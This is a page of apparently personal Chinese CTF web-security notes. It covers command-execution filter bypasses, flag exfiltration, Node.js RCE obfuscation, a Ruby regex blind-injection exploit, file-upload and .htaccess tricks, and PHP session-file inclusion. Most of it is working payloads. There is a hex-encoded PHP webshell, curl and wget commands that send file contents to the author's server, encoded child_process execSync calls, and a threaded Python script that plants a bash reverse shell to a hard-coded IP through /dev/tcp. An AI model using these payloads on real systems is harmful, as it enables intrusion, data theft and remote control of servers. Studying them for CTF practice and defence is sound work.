<h3 id="压缩法"><a href="#压缩法" class="headerlink" title="压缩法"></a>压缩法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvf flag.tar flag.php #tar压缩</span><br><span class="line">tar zcvf flag.tar.gz flag.php  #tar解压</span><br><span class="line">zip flag.zip flag.php  #zip压缩</span><br><span class="line">unzip flag.zip  #zip解压</span><br></pre></td></tr></table></figure>

<h3 id="写shell法"><a href="#写shell法" class="headerlink" title="写shell法"></a>写shell法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php</span><br><span class="line">&#x2F;&#x2F;echo &quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot; &gt; webshell.php</span><br></pre></td></tr></table></figure>

<h3 id="利用vps反弹shell"><a href="#利用vps反弹shell" class="headerlink" title="利用vps反弹shell"></a>利用vps反弹shell</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在自己的公网服务器站点根目录写入php文件，内容如下：</span><br><span class="line">&lt;!-- record.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data =$_GET[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">$f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">fwrite($f,$data);</span><br><span class="line">fclose($f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在目标服务器的测试点可以发送下面其中任意一条请求进行测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;*.*.*.**&#x2F;record.php?data&#x3D;&#96;cat flag.php|base64&#96;</span><br><span class="line">wget http:&#x2F;&#x2F;*.*.*.*&#x2F;record.php?data&#x3D;&#96;cat flag.php|base64&#96;</span><br></pre></td></tr></table></figure>



<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>1.在公网服务器监听监听端口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">nc -lp <span class="number">9999</span>（端口号）</span><br></pre></td></tr></table></figure>

<p>2.向目标服务器发起http请求，执行curl命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl ip:9999</span><br></pre></td></tr></table></figure>

<p>参考<a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/detail/286904">https://bbs.huaweicloud.com/blogs/detail/286904</a></p>
<h4 id="法三，外带flag"><a href="#法三，外带flag" class="headerlink" title="法三，外带flag"></a>法三，外带flag</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -d @&#x2F;home&#x2F;www-data&#x2F;res.txt http:&#x2F;&#x2F;xx:xxx</span><br><span class="line">curl http:&#x2F;&#x2F;xx:xx&#x2F;?d&#x3D;&#96;php -r &#39;file_&#39;|base64&#96;</span><br><span class="line">echo &#96;ps&#96;&gt;&#x2F;home&#x2F;www-data&#x2F;res.txt</span><br></pre></td></tr></table></figure>

<p>第一条是读取文件内容，第二条是执行命令，可以将执行命令的结果保存为一个文件，然后再去进行读取</p>
<h2 id="nodejs-RCE"><a href="#nodejs-RCE" class="headerlink" title="nodejs RCE"></a>nodejs RCE</h2><h3 id="1-child-process"><a href="#1-child-process" class="headerlink" title="1.child_process"></a>1.child_process</h3><p>child_process是用来执行系统命令模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;);</span><br><span class="line">require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;);</span><br><span class="line">require(&quot;child_process&quot;).execFile(&quot;&#x2F;bin&#x2F;sleep&quot;,[&quot;3&quot;]); &#x2F;&#x2F;调用某个可执行文件，在第二个参数传args</span><br><span class="line">require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]);</span><br><span class="line">require(&quot;child_process&quot;).spawnSync(&#39;sleep&#39;, [&#39;3&#39;]);</span><br><span class="line">require(&quot;child_process&quot;).execFileSync(&#39;sleep&#39;, [&#39;3&#39;]);</span><br></pre></td></tr></table></figure>

<h3 id="2-nodejs中的命令执行过滤关键字"><a href="#2-nodejs中的命令执行过滤关键字" class="headerlink" title="2.nodejs中的命令执行过滤关键字"></a>2.nodejs中的命令执行过滤关键字</h3><h4 id="16进制编码绕过"><a href="#16进制编码绕过" class="headerlink" title="16进制编码绕过"></a>16进制编码绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&quot;child_process&quot;)[&quot;exe\x63Sync&quot;](&quot;curl 127.0.0.1:1234&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&quot;child_process&quot;)[&quot;exe\u0063Sync&quot;](&quot;curl 127.0.0.1:1234&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="加号拼接"><a href="#加号拼接" class="headerlink" title="加号拼接"></a>加号拼接</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&#39;child_process&#39;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;curl 127.0.0.1:1234&#39;)</span><br></pre></td></tr></table></figure>

<h4 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&#39;child_process&#39;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#39;curl 127.0.0.1:1234&#39;)</span><br></pre></td></tr></table></figure>

<h4 id="concat连接"><a href="#concat连接" class="headerlink" title="concat连接"></a>concat连接</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(Buffer.from(&#39;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik&#x3D;&#39;,&#39;base64&#39;).toString())</span><br></pre></td></tr></table></figure>

<h4 id="Obejct-keys"><a href="#Obejct-keys" class="headerlink" title="Obejct.keys"></a>Obejct.keys</h4><p>实际上通过<code>require</code>导入的模块是一个<code>Object</code>，所以就可以用<code>Object</code>中的方法来操作获取内容。利用<code>Object.values</code>就可以拿到<code>child_process</code>中的各个函数方法，再通过数组下标就可以拿到<code>execSync</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(require(&#39;child_process&#39;).constructor&#x3D;&#x3D;&#x3D;Object)</span><br><span class="line">&#x2F;&#x2F;true</span><br><span class="line">Object.values(require(&#39;child_process&#39;))[5](&#39;curl 127.0.0.1:1234&#39;)</span><br></pre></td></tr></table></figure>

<h4 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h4><p>在js中，需要使用<code>Reflect</code>这个关键字来实现反射调用函数的方式。譬如要得到<code>eval</code>函数，可以首先通过<code>Reflect.ownKeys(global)</code>拿到所有函数，然后<code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))]</code>即可得到eval</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Reflect</span>.ownKeys(<span class="built_in">global</span>))</span><br><span class="line"><span class="comment">//返回所有函数</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">global</span>[<span class="built_in">Reflect</span>.ownKeys(<span class="built_in">global</span>).find(<span class="function"><span class="params">x</span>=&gt;</span>x.includes(<span class="string">&#x27;eval&#x27;</span>))])</span><br><span class="line"><span class="comment">//拿到eval</span></span><br></pre></td></tr></table></figure>

<p>拿到eval之后，就可以常规思路rce了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">global</span>[<span class="built_in">Reflect</span>.ownKeys(<span class="built_in">global</span>).find(<span class="function"><span class="params">x</span>=&gt;</span>x.includes(<span class="string">&#x27;eval&#x27;</span>))](<span class="string">&#x27;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这里虽然有可能被检测到的关键字，但由于<code>mainModule</code>、<code>global</code>、<code>child_process</code>等关键字都在字符串里，可以利用上面提到的方法编码，譬如16进制。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">global</span>[<span class="built_in">Reflect</span>.ownKeys(<span class="built_in">global</span>).find(<span class="function"><span class="params">x</span>=&gt;</span>x.includes(<span class="string">&#x27;eval&#x27;</span>))](<span class="string">&#x27;\x67\x6c\x6f\x62\x61\x6c\x5b\x52\x65\x66\x6c\x65\x63\x74\x2e\x6f\x77\x6e\x4b\x65\x79\x73\x28\x67\x6c\x6f\x62\x61\x6c\x29\x2e\x66\x69\x6e\x64\x28\x78\x3d\x3e\x78\x2e\x69\x6e\x63\x6c\x75\x64\x65\x73\x28\x27\x65\x76\x61\x6c\x27\x29\x29\x5d\x28\x27\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29\x27\x29&#x27;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里还有个小trick，如果过滤了<code>eval</code>关键字，可以用<code>includes(&#39;eva&#39;)</code>来搜索<code>eval</code>函数，也可以用<code>startswith(&#39;eva&#39;)</code>来搜索</p>
</blockquote>
<h4 id="过滤中括号的情况"><a href="#过滤中括号的情况" class="headerlink" title="过滤中括号的情况"></a>过滤中括号的情况</h4><p>在<code>3.2</code>中，获取到eval的方式是通过<code>global</code>数组，其中用到了中括号<code>[]</code>，假如中括号被过滤，可以用<code>Reflect.get</code>来绕</p>
<blockquote>
<p><code>Reflect.get(target, propertyKey[, receiver])</code>的作用是获取对象身上某个属性的值，类似于<code>target[name]</code>。</p>
</blockquote>
<p>所以取eval函数的方式可以变成</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Reflect</span>.get(<span class="built_in">global</span>, <span class="built_in">Reflect</span>.ownKeys(<span class="built_in">global</span>).find(<span class="function"><span class="params">x</span>=&gt;</span>x.includes(<span class="string">&#x27;eva&#x27;</span>)))</span><br></pre></td></tr></table></figure>

<p>后面拼接上命令执行的payload即可。</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p>
<h2 id="bash盲注"><a href="#bash盲注" class="headerlink" title="bash盲注"></a>bash盲注</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/26/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">正则匹配时间盲注</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-26</time><div class="content"><h2 id="正则匹配时间盲注"><a href="#正则匹配时间盲注" class="headerlink" title="正则匹配时间盲注"></a>正则匹配时间盲注</h2><p>论文：<a target="_blank" rel="noopener" href="https://diary.shift-js.info/blind-regular-expression-injection/">https://diary.shift-js.info/blind-regular-expression-injection/</a><br>2021ciscn 正则表达式盲注exp</p>
<figure class="highlight rs"><table><tr><td class="code"><pre><span class="line">require <span class="symbol">&#x27;net</span>/http&#x27;</span><br><span class="line"></span><br><span class="line">CHALLENGE = <span class="symbol">&#x27;http</span>:<span class="comment">//127.0.0.1:4567/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>.class_eval <span class="keyword">do</span></span><br><span class="line">  def hex</span><br><span class="line">    res = &#x27;&#x27;</span><br><span class="line">    <span class="keyword">self</span>.each_byte <span class="keyword">do</span> |i|</span><br><span class="line">      res += <span class="string">&quot;%02x&quot;</span> % i</span><br><span class="line">    end</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def random(len)</span><br><span class="line">  chars = (<span class="string">&quot;a&quot;</span>..<span class="string">&quot;z&quot;</span>).to_a + (<span class="string">&quot;A&quot;</span>..<span class="string">&quot;Z&quot;</span>).to_a + (<span class="string">&quot;0&quot;</span>..<span class="string">&quot;9&quot;</span>).to_a</span><br><span class="line">  s = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="number">1</span>.upto(len) <span class="keyword">do</span></span><br><span class="line">    s &lt;&lt; chars[rand(chars.size - <span class="number">1</span>)]</span><br><span class="line">  end</span><br><span class="line">  s</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def check_result(reg, suffix)</span><br><span class="line">  full_regexp = <span class="string">&quot;^(?=&quot;</span> + reg + <span class="string">&quot;)((.*)*)*&quot;</span> + suffix</span><br><span class="line">  p full_regexp</span><br><span class="line">  uri = URI(CHALLENGE + <span class="symbol">&#x27;check</span>/&#x27; + full_regexp.hex)</span><br><span class="line">  Net::HTTP.get_response(uri)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def leak(flag, r)</span><br><span class="line">  chars = &#x27;<span class="number">0123456789</span>abcdef&#x27;</span><br><span class="line">  (<span class="number">0</span>..<span class="number">15</span>).each <span class="keyword">do</span> |i|</span><br><span class="line">    <span class="keyword">if</span> check_result(flag + chars[i], r).body[<span class="string">&quot;False&quot;</span>]</span><br><span class="line">      p flag + chars[i]</span><br><span class="line">      <span class="keyword">return</span> leak(flag + chars[i], r)</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">r = random(<span class="number">10</span>)+<span class="string">&#x27;$&#x27;</span></span><br><span class="line">leak(&#x27;&#x27;, r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="string">&quot;facdf9972bb5fdf9c35d6e09770e9af7&quot;</span></span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/18/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-18</time><div class="content"><h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><h2 id="前段验证绕过"><a href="#前段验证绕过" class="headerlink" title="前段验证绕过"></a>前段验证绕过</h2><p>改js文件</p>
<h2 id="MIME-TYPE绕过"><a href="#MIME-TYPE绕过" class="headerlink" title="MIME-TYPE绕过"></a>MIME-TYPE绕过</h2><p>抓包改</p>
<h2 id="黑名单后缀绕过"><a href="#黑名单后缀绕过" class="headerlink" title="黑名单后缀绕过"></a>黑名单后缀绕过</h2><p>选择php3、php4、phtml等不常见后缀</p>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><h2 id="文件内容绕过"><a href="#文件内容绕过" class="headerlink" title="文件内容绕过"></a>文件内容绕过</h2><?php短标签的替代

## .htaccess的利用

### 按照php进行解析

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler php5-script .jpg</span><br><span class="line">&lt;!--将.jpg文件按照php代码进行解析执行--&gt;</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php.jpg</span><br><span class="line">&lt;!--将.jpg文件按照php代码进行解析执行--&gt;</span><br><span class="line"></span><br><span class="line">Sethandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;!--将该目录及子目录下的文件均按照php文件解析执行--&gt;</span><br></pre></td></tr></table>

### 进行文件包含

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_valueauto_append_file &#x2F;tmp&#x2F;webshell.txt</span><br><span class="line">php_valueauto_append_file &#x2F;tmp&#x2F;sess_xxxxxx</span><br></pre></td></tr></table></figure>

### 上传htaccess发现有内容过滤（php）

**方法1**.：使用cgi方式进行解析
将以下内容写入htaccess后上传
内容为：使用cgi的解析脚本

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">SetHandlercgi-script</span><br></pre></td></tr></table></figure>

上传cgi文件

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-Type: text&#x2F;plain”</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

**方法2**:反斜线+换行

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddTypeapplication&#x2F;x-httpd-p\</span><br><span class="line">hp.jpg</span><br></pre></td></tr></table></figure>

**方法3**：使用shtml方式进行解析

htaccess上传一下内容

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType text&#x2F;html .shtml</span><br><span class="line">AddHandler server-parsed .shtml</span><br><span class="line">Options Includes</span><br></pre></td></tr></table></figure>

shtml内进行命令执行

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;whoami&quot; --&gt;</span><br><span class="line">&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure>

### user.ini文件的利用

## 文件包含利用

### 本地文件包含利用点

#### 包含目录下的文件

#### 获取web目录或者其他配置文件

#### 包含上传的附件

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;......&#x2F;xxx.file</span><br></pre></td></tr></table></figure>

#### 包含/读取session文件:

save_path为novalue则表示存储在默认的/tmp或/var/lib/php/session目录下
我们可以利用session.upload_progress将木马写入session文件，然后包含这个session文件。

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210906203200.png" alt="img" style="zoom:67%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_xxxx</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sess_id=<span class="string">&quot;tlife&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://b.y1ng.vip:2014&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_upload</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res= s.post(</span><br><span class="line">            url=<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?page=/tmp/sess_<span class="subst">&#123;sess_id&#125;</span>&quot;</span>,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?=`bash -c &#x27;bash -i &gt;&amp; /dev/tcp/110.42.133.120/9999 0&gt;&amp;1&#x27;`;?&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;xxx.txt&#x27;</span>, open(<span class="string">&quot;shell.txt&quot;</span>, <span class="string">&quot;r&quot;</span>))&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sess_id&#125;</span><br><span class="line">        )</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    thread=threading.Thread(target=session_upload)</span><br><span class="line">    thread.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



#### 读取phpinfo可以包含临时文件

#####  1.条件竞争

##### 2.php7.0 filter新特性（伪协议）

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;mybackdoor.php</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ASCII.UCS-2BE&#x2F;resource&#x3D;index.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;a.txt</span><br></pre></td></tr></table></figure>

会造成一个segment fault，导致临时文件不会被删除

##### 3.自己包含自己

上传文件让其一直被执行包含
访问包含文件即可。

#### 利用php流input

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;input(需要allow_url_include&#x3D;On)</span><br></pre></td></tr></table></figure>

filte协议读源码：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">若base64-encode被过滤，可以更换另一种编码方式</span><br><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ASCII.UCS-2BE&#x2F;resource&#x3D;index.php如果没有过滤utf，使用convert.iconv.utf-8.utf-7</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;en&#x2F;mbstring.supported-encodings.php</span><br></pre></td></tr></table></figure>

或者直接base64-encode的二次urlencode

## 文件读取可读内容整理

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proc 是个好东西，总结下经常会用到的文件：</span><br><span class="line">1.maps 记录一些调用的扩展或者自定义so 文件</span><br><span class="line">2.environ 环境变量</span><br><span class="line">3.comm当前进程运行的程序</span><br><span class="line">4.cmdline程序运行的绝对路径</span><br><span class="line">5.cpusetdocker环境可以看machine ID</span><br><span class="line">6.cgroupdocker环境下全是machine ID 不太常用</span><br></pre></td></tr></table></figure>

## nodejs文件读取

python 或者js 最重要的文件一般都是app.js

path-as-is问题，对斜线进行url编码

## python文件读取

### 过滤了./进行目录穿越

python黑魔法：
两个都是平级目录，会直接从选取后一个目录进行读取

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">os.path.join(&#39;&#x2F;tmp&#39;,&#39;&#x2F;etc&#x2F;passwd&#39;)</span><br><span class="line">和</span><br><span class="line">os.path.join(&#39;&#x2F;tmp&#39;,&#39;&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#39;)是等价的</span><br></pre></td></tr></table></figure>

</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/12/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><span class="page-number current">13</span><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" href="/page/14/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>